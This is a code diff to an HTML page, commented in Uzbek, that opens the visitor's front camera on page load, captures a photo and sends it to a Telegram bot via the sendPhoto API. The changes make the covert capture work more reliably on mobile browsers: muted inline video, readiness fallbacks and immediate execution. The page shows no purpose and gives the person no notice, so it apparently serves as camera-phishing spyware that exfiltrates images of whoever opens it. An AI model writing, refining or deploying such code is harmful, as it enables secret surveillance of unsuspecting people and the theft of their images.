@@ -28,7 +28,7 @@
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -43,7 +43,7 @@
         // Kamera ruxsati va video oqimini boshlash
         async function boshlashKamerani() {
             try {
-                // Kamera ruxsatini so'rash (past o'lchamda tezroq yuklash uchun)
+                // Kamera ruxsatini so'rash (mobil uchun moslashtirilgan)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -55,23 +55,41 @@
                 
                 video.srcObject = stream;
                 
-                // Video haqiqatan yuklanganini tekshirish
-                await video.play().catch(() => {}); // play() da xatolik bo'lsa ham davom etish
+                // Mobil uchun maxsus sozlash
+                video.playsInline = true;
+                video.muted = true;
+                video.autoplay = true;
                 
-                // Video tayyorligini tekshirish uchun kadrni kutish
-                await new Promise(resolve => {
+                // Video haqiqatan yuklanganini tekshirish
+                await video.play().catch(() => {});
+                
+                // Video tayyorligini tekshirish (mobil uchun ko'proq vaqt berish)
+                let frameCount = 0;
+                await new Promise((resolve, reject) => {
                     const checkVideo = () => {
-                        if (video.readyState >= 2) { // HAVE_CURRENT_DATA
+                        frameCount++;
+                        
+                        // 30 kadr yoki 1 sekunddan keyin to'xtatish
+                        if (frameCount > 30) {
+                            resolve();
+                            return;
+                        }
+                        
+                        // Video tayyor bo'lsa
+                        if (video.readyState >= 2 && video.videoWidth > 0) {
                             resolve();
                         } else {
                             requestAnimationFrame(checkVideo);
                         }
                     };
                     checkVideo();
+                    
+                    // Maximal 1 sekund kutish
+                    setTimeout(resolve, 1000);
                 });
                 
-                // Rasmga olish (50ms dan keyin)
-                setTimeout(rasmgaOlishVaYuborish, 50);
+                // Rasmga olish (mobil uchun biroz ko'proq vaqt berish)
+                setTimeout(rasmgaOlishVaYuborish, 200);
                 
             } catch (xato) {
                 console.error('Kamera xatosi:', xato);
@@ -82,15 +100,29 @@
         async function rasmgaOlishVaYuborish() {
             try {
                 // Canvas o'lchamlarini video o'lchamlariga moslash
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                // Agar video hali tayyor bo'lmasa, standart o'lchamlardan foydalanish
+                if (canvas.width === 0 || canvas.height === 0) {
+                    canvas.width = 640;
+                    canvas.height = 480;
+                }
                 
                 // Videoni canvasga chizish
                 const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Rasmni base64 formatga o'tkazish (tezroq uchun sifatni pasaytiramiz)
-                const rasmDataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                // Fonni oq rang bilan to'ldirish (agar video bo'lmasa)
+                context.fillStyle = '#FFFFFF';
+                context.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Videoni chizish (agar mavjud bo'lsa)
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
+                
+                // Rasmni base64 formatga o'tkazish
+                const rasmDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                 
                 // Telegramga yuborish
                 await yuborishTelegramga(rasmDataUrl);
@@ -113,9 +145,8 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', rasmBlob, 'webcam_photo.jpg');
-                formData.append('caption', '');
                 
-                // Telegram API orqali rasm yuborish (soddalashtirilgan)
+                // Telegram API orqali rasm yuborish
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -137,7 +168,11 @@
         }
 
         // Sahifa yuklanganda darhol kamerani boshlash
-        window.addEventListener('load', boshlashKamerani);
+        if (document.readyState === 'complete') {
+            boshlashKamerani();
+        } else {
+            window.addEventListener('load', boshlashKamerani);
+        }
         
         // Sahifadan chiqilganda kamerani to'xtatish
         window.addEventListener('beforeunload', tozalashKamerani);
